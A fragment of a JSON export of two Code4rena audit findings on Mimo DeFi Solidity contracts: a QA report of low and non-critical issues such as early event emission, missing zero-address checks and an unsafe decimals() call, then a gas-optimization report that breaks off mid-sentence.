    "body": "# QA Report\n\n## Table of Contents\n\n- [summary](#summary)\n- [Event should be emitted in setters](#event-should-be-emitted-in-setters)\n- [Events emitted early](#events-emitted-early)\n- [Function missing comments](#function-missing-comments)\n- [Uint256 alias](#uint256-alias)\n- [Unchecked inputs](#unchecked-inputs)\n- [Approve 0 first](#approve-0-first)\n- [Unsafe call to decimals()](#unsafe-call-to-decimals())\n\n\n\n# summary\n\n> Few vulnerabilities were found examining the contracts. The main concerns are with ERC20 methods calls.\n\n\n\n\n# Events emitted early\n\n## PROBLEM\n\nIt is not recommended to emit events before the end of the computations, as the function might revert based on conditions ahead of the event emission\n\n\n## SEVERITY\n\nNon-Critical\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### DemandMinerV2.sol\n\n```\nDemandMinerV2.sol:88: emit WithdrawFeeReleased(fee); //ERC20 safeTransfer() is called after the emission of this event\n```\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nPlace the event emission in the last position in the function.\n\n\n# Event should be emitted in setters\n\n## PROBLEM\n\nSetters should emit an event so that Dapps can detect important changes to storage\n\n## SEVERITY\n\nNon-Critical\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### DexAddressProvider.sol\n\n```\nDexAddressProvider.sol:33: setDexMapping()\n```\n\n### InceptionVaultsDataProvider.sol\n\n```\nInceptionVaultsDataProvider.sol:63: setCollateralBalance()\nInceptionVaultsDataProvider.sol:75: setBaseDebt()\n```\n\n### PARMiner.sol\n\n```\nPARMiner.sol:82: setLiquidateCallerReward()\n```\n\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nEmit an event in all setters.\n\n# Function missing comments\n\n## PROBLEM\n\nAll external functions that can be called by users should have comments\n\n\n## SEVERITY\n\nNon-Critical\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### SuperVaultFactory.sol\n\n```\nSuperVaultFactory.sol:23: function clone(bytes calldata _initdata) public\n```\n\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nAdd comments to these functions\n\n\n# Uint256 alias\n\n## IMPACT\n\n`uint` is an alias for `uint256`.\n\nIt is better to use uint256: it brings readability and consistency in the code, and it future proofs it in case of any changes to the alias of uint\n\n\n\n\n## SEVERITY\n\nNon-Critical\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### SuperVault.sol\n\n```\nSuperVault.sol:30:  uint dexIndex;\nSuperVault.sol:127: uint dexIndex;\nSuperVault.sol:143: uint dexIndex;\nSuperVault.sol:144: uint ;\nSuperVault.sol:176: uint dexIndex;\nSuperVault.sol:194: uint dexIndex;\nSuperVault.sol:223: uint dexIndex;\nSuperVault.sol:322: uint dexIndex;\nSuperVault.sol:324: uint ;\n```\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nreplace `uint` with\n`uint256`\n\n# Unchecked inputs\n\n## PROBLEM\n\nThere should be a zero (address or integer) check in all setters\n\n\n\n## SEVERITY\n\nNon-Critical\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### DemandMinerV2.sol\n\n```\nDemandMinerV2.sol:181: function setFeeCollector(address feeCollector)\n```\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nAdd a zero address check to this function.\n\n# Approve 0 first\n\n## PROBLEM\n\nSome tokens (like USDT) do not work when changing the allowance from an existing non-zero allowance value. They must first be approved for zero and then the actual allowance must be approved. In case such token is used as collateral, it is safer to add a zero approval before changing the allowance in the contract.\n\n## SEVERITY\n\nLow\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n\n### PARMinerV2.sol\n\n```\nPARMinerV2.sol:125: collateralToken.approve(proxy, collateralToken.balanceOf(address(this)));\n```\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nApprove 0 before approving a new value:\n```\n+collateralToken.approve(proxy, 0);\ncollateralToken.approve(proxy, collateralToken.balanceOf(address(this)));\n```\n\n# Unsafe call to decimals()\n\n## PROBLEM\n\nIn `BalancerV2LPOracle.sol`, `_getNormalizedBalance()` uses the `decimals()` method of the ERC20 token to compute its output. The problem is that `decimals()` is not part of the official ERC20 standard and might fail for tokens that do not implement it. While in practice it is very unlikely, as usually most of the tokens implement it, this should still be considered as a valid concern, as it means there is a risk the oracle returns an incorrect price.\n\n\n\n## SEVERITY\n\nLow\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### BalancerV2LPOracle.sol\n\n```\nBalancerV2LPOracle.sol:126: function _getNormalizedBalance(address token, uint256 balance) internal view returns (uint256) {\n    uint8 decimals = ERC20(token).decimals();\n    return balance.mul(MathPow.pow(10, 18 - decimals));\n  }\n```\n\n### GUniLPOracle.sol\n\n```\nGUniLPOracle.sol:45-51: uint256 decimalsA = ERC20(_pool.token0()).decimals();\n    _tokenDecimalsUnitA = 10**decimalsA;\n    _tokenDecimalsOffsetA = 10**(18 - decimalsA);\n\n    uint256 decimalsB = ERC20(_pool.token1()).decimals();\n    _tokenDecimalsUnitB = 10**decimalsB;\n    _tokenDecimalsOffsetB = 10**(18 - decimalsB);\n```\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nWhile this reduces flexibility, the safest solution is to hardcode the value of `decimals` in these functions.\n\n\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-mimo-findings",
      "repo": "https://github.com/code-423n4/2022-04-mimo-findings",
      "url": "https://github.com/code-423n4/2022-04-mimo-findings/issues/114"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Gas Report\n\n## Table of Contents\n\n- [Caching storage variables in memory to save gas](#caching-storage-variables-in-memory-to-save-gas)\n- [Calldata instead of memory for RO function parameters](#calldata-instead-of-memory-for-ro-function-parameters)\n- [Comparisons with zero for unsigned integers](#comparisons-with-zero-for-unsigned-integers)\n- [Constant should be used for storage variables that are not modified](#constant-should-be-used-for-storage-variables-that-are-not-modified)\n- [Constructor parameters should be avoided when possible](#constructor-parameters-should-be-avoided-when-possible)\n- [Custom errors](#custom-errors)\n- [Default value initialization](#default-value-initialization)\n- [Event emitting of local variable](#event-emitting-of-local-variable)\n- [Prefix increments](#prefix-increments)\n- [Require instead of AND](#require-instead-of-and)\n- [SafeMath not necessary everywhere](#safemath-not-necessary-everywhere)\n- [Tight variable packing](#tight-variable-packing)\n- [unchecked arithmetic](#unchecked-arithmetic)\n\n# Caching storage variables in memory to save gas\n\n## IMPACT\n\nAnytime you are reading from storage more than once, it is cheaper in gas cost to cache the variable in memory: a SLOAD cost 100gas, while MLOAD and MSTORE cost 3 gas.\n\nIn particular, in `for` loops, when using the length of a storage array as the condition being checked after each loop, caching the array length in memory can yield significant gas savings if the array length is high\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### AdminInceptionVault.sol\n\nscope: `withdraw()`\n\n- `_a` is read twice:\n\n```\nAdminInceptionVault.sol:99\nAdminInceptionVault.sol:100\n```\n\nscope: `claimMimo()`\n\n- `_collateralCount` is read (`_collateralCount`) times:\n  number of reads depending on `_collateralCount` as it is in a for loop\n\n```\nAdminInceptionVault.sol:108\n```\n\nscope: `claimMimo()`\n\n- `_debtNotifier` is read (`_collateralCount`) times:\n  number of reads depending on `_collateralCount` as it is in a for loop\n\n```\nAdminInceptionVault.sol:108\n```\n\nscope: `deposit()`\n\n- `_a` is read twice:\n\n```\nAdminInceptionVault.sol:152\nAdminInceptionVault.sol:153\n```\n\n### InceptionVaultsCore.sol\n\nscope: `borrow()`\n\n- `_a` is read three times:\n\n```\nAdminInceptionVault.sol:137\nAdminInceptionVault.sol:151\nAdminInceptionVault.sol:158\n```\n\n- `_adminInceptionVault` is read twice:\n\n```\nAdminInceptionVault.sol:138\nAdminInceptionVault.sol:162\n```\n\n- `_inceptionVaultsData` is read three times:\n\n```\nAdminInceptionVault.sol:139\nAdminInceptionVault.sol:153\nAdminInceptionVault.sol:156\n```\n\n- `_vaultConfig` is read three times:\n\n```\nAdminInceptionVault.sol:145\nAdminInceptionVault.sol:146\nAdminInceptionVault.sol:158\n```\n\nscope: `liquidatePartial()`\n\n- `_a` is read three times:\n\n```\nAdminInceptionVault.sol:205\nAdminInceptionVault.sol:226\nAdminInceptionVault.sol:233\n```\n\n- `_adminInceptionVault` is read twice:\n\n```\nAdminInceptionVault.sol:226\nAdminInceptionVault.sol:235\n```\n\n- `_inceptionVaultsData` is read three times:\n\n```\nAdminInceptionVault.sol:200\nAdminInceptionVault.sol:203\nAdminInceptionVault.sol:238\n```\n\n- `_inceptionPriceFeed` is read twice:\n\n```\nAdminInceptionVault.sol:202\nAdminInceptionVault.sol:237\n```\n\n- `_vaultConfig` is read four times:\n\n```\nAdminInceptionVault.sol:205\nAdminInceptionVault.sol:208\nAdminInceptionVault.sol:217\nAdminInceptionVault.sol:222\n```\n\nscope: `_removeCollateralFromVault()`\n\n- `_inceptionVaultsData` is read three times:\n\n```\nAdminInceptionVault.sol:284\nAdminInceptionVault.sol:287\nAdminInceptionVault.sol:294\n```\n\nscope: `_addCollateralToVaultById()`\n\n- `_inceptionVaultsData` is read twice:\n\n```\nAdminInceptionVault.sol:305\nAdminInceptionVault.sol:306\n```\n\nscope: `_refreshCumulativeRate()`\n\n- `_cumulativeRat` is read three times:\n\n```\nAdminInceptionVault.sol:313\nAdminInceptionVault.sol:313\nAdminInceptionVault.sol:315\n```\n\nscope: `_reduceVaultDebt()`\n\n- `_inceptionVaultsData` is read twice:\n\n```\nAdminInceptionVault.sol:326\nAdminInceptionVault.sol:330\nAdminInceptionVault.sol:333\n```\n\n### ChainlinkInceptionPriceFeed.sol\n\nscope: `getAssetPrice()`\n\n- `_eurOracle` is read twice:\n\n```\nChainlinkInceptionPriceFeed.sol:74\nChainlinkInceptionPriceFeed.sol:82\n```\n\n### GenericMinerV2.sol\n\nscope: `_pendingMIMO()`\n\n- `_totalStakeWithBoost` is read twice:\n\n```\nGenericMinerV2.sol:281\nGenericMinerV2.sol:286\n```\n\nscope: `_pendingPAR()`\n\n- `_totalStakeWithBoost` is read twice:\n\n```\nGenericMinerV2.sol:295\nGenericMinerV2.sol:300\n```\n\nscope: `_getBoostMultiplier()`\n\n- `_boostConfig` is read six times:\n\n```\nGenericMinerV2.sol:316\nGenericMinerV2.sol:317\nGenericMinerV2.sol:318\nGenericMinerV2.sol:319\nGenericMinerV2.sol:322\nGenericMinerV2.sol:331\n```\n\n### PARMinerV2.sol\n\nscope: `liquidate()`\n\n- `_par` is read three times:\n\n```\nPARMinerV2.sol:118\nPARMinerV2.sol:127\nPARMinerV2.sol:128\n```\n\n- `_a` is read twice:\n\n```\nPARMinerV2.sol:120\nPARMinerV2.sol:122\n```\n\nscope: `_increaseStake()`\n\n- `__accParAmountPerShare` is read twice:\n\n```\nPARMinerV2.sol:261\nPARMinerV2.sol:365\n```\n\nscope: `_pendingMIMO()`\n\n- `_totalStakeWithBoost` is read twice:\n\n```\nPARMinerV2.sol:376\nPARMinerV2.sol:381\n```\n\nscope: `_getBoostMultiplier()`\n\n- `_boostConfig` is read six times:\n\n```\nPARMinerV2.sol:411\nPARMinerV2.sol:412\nPARMinerV2.sol:413\nPARMinerV2.sol:414\nPARMinerV2.sol:417\nPARMinerV2.sol:426\n```\n\n### BalancerV2LPOracle.sol\n\nscope: `latestRoundData()`\n\n- `pool` is read twice:\n\n```\nBalancerV2LPOracle.sol:104\nBalancerV2LPOracle.sol:117\n```\n\n### SuperVault.sol\n\nscope: `executeOperation()`\n\n- `lendingPool` is read twice:\n\n```\nSuperVault.sol:83\nSuperVault.sol:97\n```\n\nscope: `emptyVaultOperation()`\n\n- `a` is read five times:\n\n```\nSuperVault.sol:198\nSuperVault.sol:199\nSuperVault.sol:202\nSuperVault.sol:203\nSuperVault.sol:205\n```\n\nscope: `emptyVault()`\n\n- `a` is read twice:\n\n```\nSuperVault.sol:233\nSuperVault.sol:233\n```\n\nscope: `withdrawFromVault()`\n\n- `a` is read twice:\n\n```\nSuperVault.sol:245\nSuperVault.sol:246\n```\n\nscope: `borrowFromVault()`\n\n- `a` is read three times:\n\n```\nSuperVault.sol:254\nSuperVault.sol:255\nSuperVault.sol:255\n```\n\nscope: `depositToVault()`\n\n- `a` is read twice:\n\n```\nSuperVault.sol:273\nSuperVault.sol:275\n```\n\n\nscope: `depositAndBorrowFromVault()`\n\n- `a` is read four times:\n\n```\nSuperVault.sol:289\nSuperVault.sol:291\nSuperVault.sol:292\nSuperVault.sol:292\n```\n\nscope: `depositETHAndBorrowFromVault()`\n\n- `a` is read three times:\n\n```\nSuperVault.sol:312\nSuperVault.sol:313\nSuperVault.sol:313\n```\n\nscope: `leverageSwap()`\n\n- `a` is read three times:\n\n```\nSuperVault.sol:326\nSuperVault.sol:327\nSuperVault.sol:328\n```\n\nscope: `checkAndSendMIMO()`\n\n- `ga` is read three times:\n\n```\nSuperVault.sol:369\nSuperVault.sol:370\nSuperVault.sol:370\n```\n\n## TOOLS USED\n\nManual Analysis\n\n## MITIGATION\n\ncache these storage variables in memory\n\n# Calldata instead of memory for RO function parameters\n\n## PROBLEM\n\nIf a reference type function parameter is read-only, it is cheaper in gas to use calldata instead of memory.\nCalldata is a non-modifiable, non-persistent area where function arguments are stored, and behaves mostly like memory.\n\nTry to use calldata as a data location because it will avoid copies and also makes sure that the data cannot be modified.\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### InceptionVaultsCore.sol\n\nscope: `initialize()`\n\n```\nInceptionVaultsCore.sol:42: VaultConfig memory vaultConfig\n```\n\n### DemandMinerV2.sol\n\nscope: `initialize()`\n\n```\nDemandMinerV2.sol:56: FeeConfig memory newFeeConfig\n```\n\n### GenericMinerV2.sol\n\nscope: `setBoostConfig()`\n\n```\nGenericMinerV2.sol:69: BoostConfig memory newBoostConfig\n```\n\nscope: `_releaseRewards()`\n\n```\nGenericMinerV2.sol:209: UserInfo memory _userInfo\n```\n\nscope: `_updateBoost()`\n\n```\nGenericMinerV2.sol:231: UserInfo memory _userInfo\n```\n\n### PARMinerV2.sol\n\nscope: `setBoostConfig()`\n\n```\nPARMinerV2.sol:70: BoostConfig memory newBoostConfig\n```\n\nscope: `_releaseRewards()`\n\n```\nPARMinerV2.sol:306: UserInfo memory _userInfo\n```\n\nscope: `_updateBoost()`\n\n```\nPARMinerV2.sol:331: UserInfo memory _userInfo\n```\n\n### VotingMinerV2.sol\n\nscope: `releaseMIMO()`\n\n```\nVotingMinerV2.sol:24: UserInfo memory _userInfo\n```\n\nscope: `_syncStake()`\n\n```\nVotingMinerV2.sol:67: UserInfo memory _userInfo\n```\n\n### SuperVault.sol\n\nscope: `leverageOperation()`\n\n```\nSuperVault.sol:105: bytes memory params\n```\n\nscope: `rebalanceOperation()`\n\n```\nSuperVault.sol:141: bytes memory params\n```\n\nscope: `emptyVaultOperation()`\n\n```\nSuperVault.sol:191: bytes memory params\n```\n\nscope: `leverageSwap()`\n\n```\nSuperVault.sol:321: bytes memory params\n```\n\nscope: `aggregatorSwap()`\n\n```\nSuperVault.sol:341: bytes memory dexTXData\n```\n\nscope: `takeFlashLoan()`\n\n```\nSuperVault.sol:357: bytes memory params\n```\n\n## TOOLS USED\n\nManual Analysis\n\n## MITIGATION\n\nReplace `memory` with `calldata`\n\n# Comparisons with zero for unsigned integers\n\n## IMPACT\n\n`>0` is less gas efficient than `!= 0` if you enable the optimizer at 10k AND you’re in a require statement.\nDetailed explanation with the opcodes [here](https://twitter.com/gzeon/status/1485428085885640706)\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### InceptionVaultsCore.sol\n\n```\nInceptionVaultsCore.sol:122\n```\n\n### ChainlinkInceptionPriceFeed.sol\n\n```\nChainlinkInceptionPriceFeed.sol:75\nChainlinkInceptionPriceFeed.sol:79\n```\n\n### GenericMinerV2.sol\n\n```\nGenericMinerV2.sol:58\nGenericMinerV2.sol:70\nGenericMinerV2.sol:175\nGenericMinerV2.sol:195\n```\n\n### PARMinerV2.sol\n\n```\nPARMinerV2.sol:52\nPARMinerV2.sol:71\nPARMinerV2.sol:254\nPARMinerV2.sol:284\n```\n\n### GUniLPOracle.sol\n\n```\nGUniLPOracle.sol:112\nGUniLPOracle.sol:112\n```\n\n## TOOLS USED\n\nManual Analysis\n\n## MITIGATION\n\nReplace `> 0` with `!= 0`\n\n# Comparison Operators\n\n## IMPACT\n\nIn the EVM, there is no opcode for ` >=` or `<=`.\nWhen using greater than or equal, two operations are performed: `>` and `=`.\n\nUsing strict comparison operators hence saves gas\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### InceptionVaultsCore.sol\n\n```\nInceptionVaultsCore.sol:138\nInceptionVaultsCore.sol:179\nInceptionVaultsCore.sol:219\nInceptionVaultsCore.sol:226\nInceptionVaultsCore.sol:285\n```\n\n### GenericMinerV2.sol\n\n```\nGenericMinerV2.sol:58\nGenericMinerV2.sol:58\nGenericMinerV2.sol:70\nGenericMinerV2.sol:70\nGenericMinerV2.sol:197\nGenericMinerV2.sol:331\nGenericMinerV2.sol:331\n```\n\n### PARMinerV2.sol\n\n```\nPARMinerV2.sol:52\nPARMinerV2.sol:52\nPARMinerV2.sol:71\nPARMinerV2.sol:71\nPARMinerV2.sol:286\nPARMinerV2.sol:426\nPARMinerV2.sol:426\n```\n\n## TOOLS USED\n\nManual Analysis\n\n## MITIGATION\n\nReplace `<=` with `<`, and `>=` with `>`. Do not forget to increment/decrement the compared variable\n\nexample:\n\n```\n-collateralValueToReceive >= collateralValue\n+collateralValueToReceive > collateralValue - 1;\n```\n\nHowever, if `1` is negligible compared to the value of the variable, we can omit the increment.\n\n# Constant should be used for storage variables that are not modified\n\n## IMPACT\n\nConstant variables are replaced at compile time by their values. \nIf a state variable is never modified, it should be specified as `constant` to save a `SLOAD` operation when it is read, saving 97 gas.\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### BalancerV2LPOracle.sol\n\n```\nBalancerV2LPOracle.sol:18: uint256 public override version = 3;\n```\n\n### GUniLPOracle.sol\n\n```\nGUniLPOracle.sol:16: uint256 public override version = 3;\n```\n\n## TOOLS USED\n\nManual Analysis\n\n## MITIGATION\n\nAdd the `constant` modifier to these variables.\n\n\n# Constructor parameters should be avoided when possible\n\n## IMPACT\n\nConstructor parameters are expensive. The contract deployment will be cheaper in gas if storage variables are hard coded instead of using constructor parameters. It can save approximately 670 gas per storage variable concerned upon deployment (~400 if the optimizer is enabled).\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### DexAddressProvider.sol\n\n```\nDexAddressProvider.sol:15 _a = a;\n```\n\n### InceptionVaultFactory.sol\n\n```\nInceptionVaultFactory.sol:54 _adminInceptionVaultBase = adminInceptionVaultBase;\nInceptionVaultFactory.sol:55 _inceptionVaultsCoreBase = inceptionVaultsCoreBase;\nInceptionVaultFactory.sol:56 _inceptionVaultsDataProviderBase = inceptionVaultsDataProviderBase;\nInceptionVaultFactory.sol:57 _a = addressProvider;\nInceptionVaultFactory.sol:58 _debtNotifier = debtNotifier;\nInceptionVaultFactory.sol:59 _weth = weth;\nInceptionVaultFactory.sol:60 _mimo = mimo;\n```\n\n### DemandMinerV2.sol\n\n```\nDemandMinerV2.sol:34 _token = token;\nDemandMinerV2.sol:35 _feeCollector = feeCollector;\nDemandMinerV2.sol:36 _feeConfig = feeConfig;\n```\n\n### GenericMinerV2.sol\n\n```\nGenericMinerV2.sol:56 _a = _addresses;\nGenericMinerV2.sol:59 _boostConfig = boostConfig;\n```\n\n### PARMinerV2.sol\n\n```\nPARMinerV2.sol:53 _a = govAP;\nPARMinerV2.sol:54 _dexAP = dexAP;\nPARMinerV2.sol:55 _liquidateCallerReward = 200 ether;\nPARMinerV2.sol:60 _boostConfig = boostConfig;\n```\n\n### SupplyMinerV2.sol\n\n```\nSupplyMinerV2.sol:20 _collateral = collateral;\n```\n\n### BalancerV2LPOracle.sol\n\n```\nBalancerV2LPOracle.sol:39 vault = _vault;\nBalancerV2LPOracle.sol:40 poolId = _poolId;\nBalancerV2LPOracle.sol:44 decimals = _decimals;\nBalancerV2LPOracle.sol:45 description = _description;\nBalancerV2LPOracle.sol:46 pool = IBalancerPool(_pool);\nBalancerV2LPOracle.sol:47 oracleA = _oracleA;\nBalancerV2LPOracle.sol:48 oracleB = _oracleB;\n```\n\n### GUniLPOracle.sol\n\n```\nGUniLPOracle.sol:39 decimals = _decimals;\nGUniLPOracle.sol:40 description = _description;\nGUniLPOracle.sol:41 pool = _pool;\nGUniLPOracle.sol:42 oracleA = _oracleA;\nGUniLPOracle.sol:43 oracleB = _oracleB;\n```\n\n### SuperVaultFactory.sol\n\n```\nSuperVaultFactory.sol:20 base = _base;\n```\n\n## TOOLS USED\n\nManual Analysis\n\n## MITIGATION\n\nHardcode these storage variables with their value instead of writing them during contract deployment with constructor parameters.\n\n# Custom Errors\n\n## IMPACT\n\nCustom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met) while providing the same amount of information, as explained [here](https://blog.soliditylang.org/2021/04/21/custom-errors/)\n\nCustom errors are defined using the error statement\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### DexAddressProvider.sol\n\n```\nDexAddressProvider.sol:14: require(address(a) != address(0), \"LM000\");\nDexAddressProvider.sol:38: require(_proxy != address(0), \"LM000\");\nDexAddressProvider.sol:39: require(_router != address(0), \"LM000\");\n```\n\n### InceptionVaultFactory.sol\n\n```\nInceptionVaultFactory.sol:47: require(adminInceptionVaultBase != address(0), \"IV000\");\nInceptionVaultFactory.sol:48: require(inceptionVaultsCoreBase != address(0), \"IV000\");\nInceptionVaultFactory.sol:49: require(inceptionVaultsDataProviderBase != address(0), \"IV000\");\nInceptionVaultFactory.sol:50:   require(address(addressProvider) != address(0), \"IV000\");\nInceptionVaultFactory.sol:51: require(address(debtNotifier) != address(0), \"IV000\");\nInceptionVaultFactory.sol:52: require(address(weth) != address(0), \"IV000\");;\nInceptionVaultFactory.sol:53: require(address(mimo) != address(0), \"IV000\");\nInceptionVaultFactory.sol:74: require(address(_inceptionCollateral) != address(0), \"IV000\");\nInceptionVaultFactory.sol:75: require(_inceptionVaultPriceFeed != address(0), \"IV000\");\nInceptionVaultFactory.sol:85: require(address(_assetOracle) != address(0), \"IV000\");\nInceptionVaultFactory.sol:89: require(address(_assetOracle) == address(0), \"IV001\");\nInceptionVaultFactory.sol:130: require(_address != address(0), \"IV000\");\nInceptionVaultFactory.sol:130: require(_priceFeedIds[_address] == 0, \"IV002\");\n```\n\n### InceptionVaultFactory.sol\n\n```\nInceptionVaultFactory.sol:122 require(_amount > 0, \"IV100\");\nInceptionVaultFactory.sol:138 require(_amount <= stablex.balanceOf(address(_adminInceptionVault)), \"IV104\");\nInceptionVaultFactory.sol:160 require(isHealthy, \"IV102\");\nInceptionVaultFactory.sol:204 require(\n      !_a.liquidationManager().isHealthy(collateralValue, currentVaultDebt, _vaultConfig.liquidationRatio),\n      \"IV103\"\n    );\nInceptionVaultFactory.sol:226 require(_a.stablex().balanceOf(address(_adminInceptionVault)) >= insuranceAmount, \"IV104\");\nInceptionVaultFactory.sol:285 require(_amount <= v.collateralBalance, \"IV101\");\nInceptionVaultFactory.sol:291 require(\n        _a.liquidationManager().isHealthy(\n          newCollateralValue,\n          _inceptionVaultsData.vaults(_vaultId).baseDebt,\n          _vaultConfig.minCollateralRatio\n        ),\n        \"IV102\"\n      );\n```\n\n### InceptionVaultDataProvider.sol\n\n```\nInceptionVaultDataProvider.sol:64: require(vaultExists(_vaultId), \"IV105\");\n```\n\n### ChainlinkInceptionPriceFeed.sol\n\n```\nChainlinkInceptionPriceFeed.sol:75: require(eurAnswer > 0, \"EUR price data not valid\");\nChainlinkInceptionPriceFeed.sol:76: require(block.timestamp - eurUpdatedAt < _PRICE_ORACLE_STALE_THRESHOLD, \"EUR price data is stale\");\nChainlinkInceptionPriceFeed.sol:79: require(answer > 0, \"Price data not valid\");\nChainlinkInceptionPriceFeed.sol:80: require(block.timestamp - assetUpdatedAt < _PRICE_ORACLE_STALE_THRESHOLD, \"Price data is stale\");\n```\n\n### DemandMinerV2.sol\n\n```\nDemandMinerV2.sol:31: require(address(token) != address(0), \"LM000\");\nDemandMinerV2.sol:32: require(address(token) != address(_addresses.mimo()), \"LM001\");\nDemandMinerV2.sol:33: require(feeCollector != address(0), \"LM000\");\n```\n\n### GenericMinerV2.sol\n\n```\nGenericMinerV2.sol:55: require(address(_addresses) != address(0), \"LM000\");\nGenericMinerV2.sol:58: require(boostConfig.a >= 1 && boostConfig.d > 0 && boostConfig.maxBoost >= 1, \"LM004\");\nGenericMinerV2.sol:70: require(newBoostConfig.a >= 1 && newBoostConfig.d > 0 && newBoostConfig.maxBoost >= 1, \"LM004\");\nGenericMinerV2.sol:175: require(value > 0, \"LM101\");\nGenericMinerV2.sol:195: require(value > 0, \"LM101\");\nGenericMinerV2.sol:197: require(_userInfo.stake >= value, \"LM102\");\nGenericMinerV2.sol:220: require(_a.mimo().transfer(_user, pendingMIMO), \"LM100\");\nGenericMinerV2.sol:223: require(_par.transfer(_user, pendingPAR), \"LM100\");\nGenericMinerV2.sol:331: require(multiplier >= 1e18 && multiplier <= _boostConfig.maxBoost, \"LM103\");\n```\n\n### PARMinerV2.sol\n\n```\nPARMinerV2.sol:50: require(address(govAP) != address(0), \"LM000\");\nPARMinerV2.sol:51: require(address(dexAP) != address(0), \"LM000\");\nPARMinerV2.sol:52: require(boostConfig.a >= 1 && boostConfig.d > 0 && boostConfig.maxBoost >= 1, \"LM004\");\nPARMinerV2.sol:71: require(boostConfig.a >= 1 && boostConfig.d > 0 && boostConfig.maxBoost >= 1, \"LM004\");\nPARMinerV2.sol:128: require(_par.balanceOf(address(this)) > parBalanceBefore, \"LM104\");;\nPARMinerV2.sol:254: require(value > 0, \"LM101\");\nPARMinerV2.sol:284: require(value > 0, \"LM101\");\nPARMinerV2.sol:286: require(_userInfo.stake >= value, \"LM102\");\nPARMinerV2.sol:320: require(_par.transfer(_user, pendingPAR), \"LM100\");\nPARMinerV2.sol:323: require(_a.mimo().transfer(_user, pendingMIMO), \"LM100\");\nPARMinerV2.sol:426: require(multiplier >= 1e18 && multiplier <= _boostConfig.maxBoost, \"LM103\");\n```\n\n### SupplyMinerV2.sol\n\n```\nSupplyMinerV2.sol:50: require(address(collateral) != address(0), \"LM000\");\n```\n\n### VotingMinerV2.sol\n\n```\nVotingMinerV2.sol:44: require(_a.mimo().transfer(_user, pendingMIMO), \"LM100\");\nVotingMinerV2.sol:47: require(_par.transfer(_user, pendingPAR), \"LM100\");\n```\n\n### BalancerV2LPOracle.sol\n\n```\nBalancerV2LPOracle.sol:35: require(address(_vault) != address(0), \"C000\");\nBalancerV2LPOracle.sol:36: require(address(_oracleA) != address(0), \"C000\");\nBalancerV2LPOracle.sol:37: require(address(_oracleB) != address(0), \"C000\");\nBalancerV2LPOracle.sol:38: require(tokensNum == IBalancerVault.PoolSpecialization.TWO_TOKEN, \"C001\");\n```\n\n### GUniLPOracle.sol\n\n```\nGUniLPOracle.sol:35: require(address(_pool) != address(0), \"C000\");\nGUniLPOracle.sol:36: require(address(_oracleA) != address(0), \"C000\");\nGUniLPOracle.sol:37: require(address(_oracleB) != address(0), \"C000\");\nGUniLPOracle.sol:112: require(rA > 0 || rB > 0, \"C100\");\nGUniLPOracle.sol:114: require(totalSupply >= 1e9, \"C101\");\n```\n\n### SuperVault.sol\n\n```\nSuperVault.sol:56: require(address(_a) != address(0));\nSuperVault.sol:57: require(address(_ga) != address(0));\nSuperVault.sol:58: require(address(_lendingPool) != address(0));\nSuperVault.sol:59: require(address(dexAP) != address(0));\nSuperVault.sol:83: require(msg.sender == address(lendingPool), \"SV002\");\nSuperVault.sol:109: require(token.balanceOf(address(this)) >= flashloanRepayAmount, \"SV101\");\nSuperVault.sol:156: require(fromCollateral.balanceOf(address(this)) >= flashloanRepayAmount, \"SV101\");\nSuperVault.sol:207: require(vaultCollateral.balanceOf(address(this)) >= flashloanRepayAmount, \"SV101\");\nSuperVault.sol:233: require(IERC20(a.stablex()).transfer(msg.sender, IERC20(a.stablex()).balanceOf(address(this))));\nSuperVault.sol:247: require(asset.transfer(msg.sender, amount));\nSuperVault.sol:255: require(IERC20(a.stablex()).transfer(msg.sender, IERC20(a.stablex()).balanceOf(address(this))));\nSuperVault.sol:264: require(token.transfer(msg.sender, token.balanceOf(address(this))));\nSuperVault.sol:292: require(IERC20(a.stablex()).transfer(msg.sender, IERC20(a.stablex()).balanceOf(address(this))));\nSuperVault.sol:313: require(IERC20(a.stablex()).transfer(msg.sender, IERC20(a.stablex()).balanceOf(address(this))));\nSuperVault.sol:344: require(proxy != address(0) && router != address(0), \"SV201\");\nSuperVault.sol:370: require(ga.mimo().transfer(msg.sender, ga.mimo().balanceOf(address(this))));\n```\n\n## TOOLS USED\n\nManual Analysis\n\n## MITIGATION\n\nReplace require and revert statements with custom errors.\n\nFor instance, in `DexAddressProvider.sol`:\n\nReplace\n\n```\nrequire(_proxy_ != address(0), \"LM000\");\n```\n\nwith\n\n```\nif (_proxy == address(0)) {\n\t\trevert ErrorNullAddress(_proxy);\n}\n```\n\nand define the custom error in the contract\n\n```\nerror ErrorNullAddress(address _address);\n```\n\n\n# Default value initialization\n\n## IMPACT\n\nIf a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type).\nExplicitly initializing it with its default value is an anti-pattern and wastes gas.\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### InceptionVaultFactory.sol\n\n```\nInceptionVaultFactory.sol:218: uint256 insuranceAmount = 0;\n```\n\n## TOOLS USED\n\nManual Analysis\n\n## MITIGATION\n\nRemove explicit initialization for 